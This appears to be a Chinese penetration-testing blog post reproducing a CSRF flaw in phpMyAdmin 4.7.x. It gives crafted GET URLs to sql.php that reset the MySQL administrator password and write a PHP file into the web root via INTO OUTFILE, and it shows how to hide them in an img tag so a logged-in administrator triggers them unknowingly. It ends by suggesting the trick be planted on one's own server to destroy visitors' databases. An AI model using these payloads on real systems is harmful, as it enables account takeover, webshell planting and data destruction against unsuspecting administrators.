---
layout: post
title: phpMyAdmin 4.7.x CSRF
categories: [渗透]
tags: [渗透]
fullview: false
comments: true
---

复现学习  
  
场景:管理员登陆phpmyadmin之后，我试验了一下，发现只要是登陆session没有失效应该是都可以的，  

利用，phpmyadmin可以通过get方式操作数据库，此版本存在csrf漏洞，通过构造一个链接(不是傻子基本都发现),所以是藏到一个地方让他自己偷偷的加载。    


### ① ###

修改管理员密码，因为可以通过get方式执行操作，所以构造语句:  



>     http://url/pma/sql.php?db=mysql&table=user&sql_query=SET%20password%20=%20PASSWORD(%27pass%27); 
>     就是把phpmyadmin首页进去的index.php换成sql.php?~~~~~~
>     藏到html里，通过image标签让浏览器自己预先加载就可以达到了偷偷改密码的目的。
>     <img src="payload">  

### ② ###
写马。  

和①原理上是一样的，都是get构造语句，执行不同的语句直接在后边构造就行。  

>     http://url/pma/sql.php?db=mysql&table=user&sql_query=select '<?php phpinfo();?>' into outfile '/var/www/html/test.php';


即使是管理员，有的时候也不一定能写，主要原因是参数
>     secure_file_priv
  

限制了读写操作，这个如果被限制的话没有什么很好的解决办法，因为要改配置文件。
### ③ ###
结合[https://www.cnblogs.com/zaqzzz/p/9355004.html](https://www.cnblogs.com/zaqzzz/p/9355004.html "phpmyadmin漏洞利用general_log和general_log_file拿权限")   

为所欲为，构造语句的时候加上分号就好了。

  


### 总结: ###

感觉这个使用的不会太多，首先这个完整的路径只要在你扫描到phpmyadmin的位置才能利用，还有尴尬的是你怎么知道谁是管理员以及让他打开html。  

不过挂在自己搭建的服务器上，只要他们访问就把数据库破坏这也是个方法。。。